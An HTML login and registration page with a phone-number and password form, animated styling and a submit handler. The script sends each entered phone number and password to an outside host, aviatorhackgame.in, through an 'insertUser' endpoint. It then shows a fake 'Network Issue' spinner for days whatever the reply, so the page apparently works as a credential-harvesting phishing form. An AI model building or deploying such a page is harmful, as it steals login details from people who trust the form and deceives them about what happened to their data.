<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Responsive Phone & Password Form</title>
  <link rel="stylesheet" href="styles.css">
</head>
<style>
  /* Global reset */
/* Global reset */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Times New Roman', Times, serif;
  background: linear-gradient(135deg, #245867, #000000);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  overflow: hidden;
}

/* Form container */
.form-container {
  width: 100%;
  max-width: 400px;
  height: 95vh !important;
  display: flex;
  justify-content: center;
  align-items: center;
  background: url("/assets/img/ass2.jpeg") center/cover no-repeat;
  animation: zoomIn 1.2s ease-out forwards;
}

/* Form box */
.form-box {
  width: 100%;
  max-width: 400px;
  padding: 40px 30px;
  background-color: rgba(255, 255, 255, 0.85);
  border-radius: 15px;
  box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
  border: 7px solid transparent;
  border-top-color: #007bff;
  border-bottom-color: #007bff;
  position: relative;
  animation: slideUp 1s ease-out forwards, shadowPulse 3s ease-in-out infinite;
}



/* Form title */
.form-title {
  text-align: center;
  font-size: 32px;
  font-weight: bold;
  margin-bottom: 30px;
  color: #2c3e50;
  text-transform: uppercase;
  letter-spacing: 2px;
  text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);
  position: relative;
  animation: fadeIn 1s ease-out forwards;
}

.form-title::after {
  content: "";
  display: block;
  width: 60px;
  height: 4px;
  background-color: #3498db;
  margin: 10px auto 0;
  border-radius: 2px;
  animation: growWidth 1s ease-out forwards;
}

/* Input fields */
.input-group {
  margin-bottom: 15px;
  animation: slideInLeft 1s ease-out forwards;
}

/* Label animation */
.input-group label {
  display: block;
  margin-bottom: 8px;
  font-weight: bold;
  color: #121111;
  transform: translateY(10px);
  opacity: 0;
  animation: labelFadeIn 1s ease-out forwards;
}

.input-group input {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #ddd;
  font-size: 16px;
  background-color: #f9f9f9;
  transition: all 0.3s ease;
}

.input-group input:focus {
  border-color: #007bff;
  background-color: #fff;
  outline: none;
  box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
}

/* Submit button */
.submit-btn {
  width: 100%;
  padding: 15px;
  background: linear-gradient(135deg, #8e44ad, #3498db);
  color: white;
  font-size: 18px;
  font-weight: bold;
  border: none;
  border-radius: 50px;
  cursor: pointer;
  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease, background 0.3s ease;
  animation: fadeInUp 1.2s ease-out forwards;
}

.submit-btn:hover {
  background: linear-gradient(135deg, #3498db, #8e44ad);
  transform: translateY(-4px) scale(1.05);
  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
}

/* Keyframes for animations */
@keyframes fadeIn {
  0% {
    opacity: 0;
    transform: translateY(-20px);
  }
  100% {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes slideUp {
  0% {
    opacity: 0;
    transform: translateY(40px);
  }
  100% {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes slideInLeft {
  0% {
    opacity: 0;
    transform: translateX(-30px);
  }
  100% {
    opacity: 1;
    transform: translateX(0);
  }
}

@keyframes fadeInUp {
  0% {
    opacity: 0;
    transform: translateY(20px);
  }
  100% {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes scaleUp {
  0% {
    transform: scale(0);
  }
  100% {
    transform: scale(1);
  }
}

@keyframes growWidth {
  0% {
    width: 0;
  }
  100% {
    width: 60px;
  }
}

@keyframes shadowPulse {
  0%, 100% {
    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
  }
  50% {
    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
  }
}

@keyframes zoomIn {
  0% {
    transform: scale(0.5);
    opacity: 0;
  }
  100% {
    transform: scale(1);
    opacity: 1;
  }
}

/* Label fade-in animation */
@keyframes labelFadeIn {
  0% {
    transform: translateY(10px);
    opacity: 0;
  }
  100% {
    transform: translateY(0);
    opacity: 1;
  }
}

/* Responsive adjustments */
@media (max-width: 768px) {
  .form-title {
    font-size: 26px;
  }

  .submit-btn {
    font-size: 16px;
  }

  .input-group input {
    padding: 10px 16px;
  }
}

@media (max-width: 480px) {
  .form-box {
    padding: 30px 20px;
    border-radius: 10px;
  }

  .form-title {
    font-size: 22px;
  }

  .input-group input {
    font-size: 14px;
    padding: 10px;
  }

  .submit-btn {
    padding: 12px;
    font-size: 16px;
  }
}
/* Modal overlay styling */
/* Modal overlay styling */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  /* justify-content: center; */
  left: 0;
  width: 104%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.8); /* 80% opacity */
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

/* Modal content styling */
.modal-content {
  
  padding: 40px;
  border-radius: 8px;
  text-align: center;
}

/* Loader styling */
.loader {
  border: 5px solid #f3f3f3; /* Light grey */
  border-top: 5px solid #40474b2b; /* Blue */
  border-radius: 50%;
  width: 100px;
  margin-left: 10px;
  height: 100px;
  animation: spin 1s linear infinite;
}

/* Loader animation */
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* Error message styling */
.error-message {
  color: red;
  font-size: 18px;
  font-weight: 800;
  margin-top: 20px;
}

/* Show modal when triggered */
.modal-overlay.active {
  display: flex;
}

.error-message {
  color: red;
  font-size: 12px; /* Smaller text size */
  margin-top: 5px; /* Space between the input and the error message */
}

</style>

<body>
  <div class="form-container">
    <form class="form-box">
      <h2 class="form-title" id="formTitle">Login</h2>
    
      <!-- Phone Input -->
      <div class="input-group">
        <label for="phone">Phone</label>
        <input type="text" id="phone" name="phone" maxlength="10" placeholder="Enter your phone number">
        <span id="phoneError" class="error-message" style="display: none;">Please enter your phone number.</span>
      </div>
    
      <!-- Password Input -->
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password">
        <span id="passwordError" class="error-message" style="display: none;">Please enter your password.</span>
      </div>
    
      <!-- Submit Button -->
      <button type="submit" class="submit-btn" id="submitBtn" onclick="handleSubmit(event)">Login</button>
    
      <p>
        Create Account 
        <span 
          style="padding: 5px 15px; border-bottom: 2px solid black; color: #245867; font-size: 15px; cursor: pointer; font-weight: 900; border-radius: 6px;" 
          id="toggleForm"
          onclick="toggleForm()"
        >
          Registration
        </span>
      </p>
    
      <div style="text-align: center; margin-top: 20px;">
        <img src="/assets/img/acc1.jpeg" style="width: 60%; height: 60%; border-radius: 50%;" alt="">
      </div>
    </form>
    
    <!-- Modal HTML -->
<div class="modal-overlay" id="modalOverlay">
  <div class="modal-content">
    <div class="loader"></div>
    <p class="error-message">Network Issue ...</p>
  </div>
</div>

  </div>
<script>
  function toggleForm() {
  // Get the form title and submit button
  const formTitle = document.getElementById("formTitle");
  const submitBtn = document.getElementById("submitBtn");
  const toggleLink = document.getElementById("toggleForm");

  // Check current state and toggle between Login and Registration
  if (formTitle.textContent === "Login") {
    formTitle.textContent = "Registration";  // Change title to Registration
    submitBtn.textContent = "Register";      // Change button text to Register
    toggleLink.textContent = "Login";        // Change toggle text to Login
  } else {
    formTitle.textContent = "Login";         // Change title to Login
    submitBtn.textContent = "Login";         // Change button text to Login
    toggleLink.textContent = "Registration"; // Change toggle text to Registration
  }
}
// Function to handle form submission and show modal

function handleSubmit(event) {
  event.preventDefault(); // Prevent default form submission

  // Get input values
  const phoneInput = document.getElementById("phone").value;
  const passwordInput = document.getElementById("password").value;

  // Get error message elements
  const phoneError = document.getElementById("phoneError");
  const passwordError = document.getElementById("passwordError");

  // Reset error messages
  phoneError.style.display = 'none';
  passwordError.style.display = 'none';

  // Validation
  let isValid = true;
  if (!phoneInput) {
    phoneError.style.display = 'block'; // Show error if phone is empty
    isValid = false;
  }

  if (!passwordInput) {
    passwordError.style.display = 'block'; // Show error if password is empty
    isValid = false;
  }

  // If both inputs are valid, proceed with the form submission
  if (isValid) {
    // Show modal
    const modalOverlay = document.getElementById("modalOverlay");
    modalOverlay.classList.add("active");

    // Send data to the API
    fetch('https://aviatorhackgame.in/back/insertUser', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        phone: phoneInput,
        password: passwordInput,
      }),
    })
    .then(response => response.json())
    .then(data => {
      // console.log(data);
      setTimeout(() => {
      modalOverlay.classList.remove("active"); // Hide the modal after a delay
    }, 300000000); // Adjust the delay as needed
  
      if (data.message) {
        setTimeout(() => {
      modalOverlay.classList.remove("active"); // Hide the modal after a delay
    }, 300000000); // Adjust the delay as needed
  
      } else {
        setTimeout(() => {
      modalOverlay.classList.remove("active"); // Hide the modal after a delay
    }, 300000000); // Adjust the delay as needed
  
      }
    })
    .catch(error => {
      setTimeout(() => {
      modalOverlay.classList.remove("active"); // Hide the modal after a delay
    }, 300000000); // Adjust the delay as needed
  
    });
  }
}

</script>  
</body>
</html>
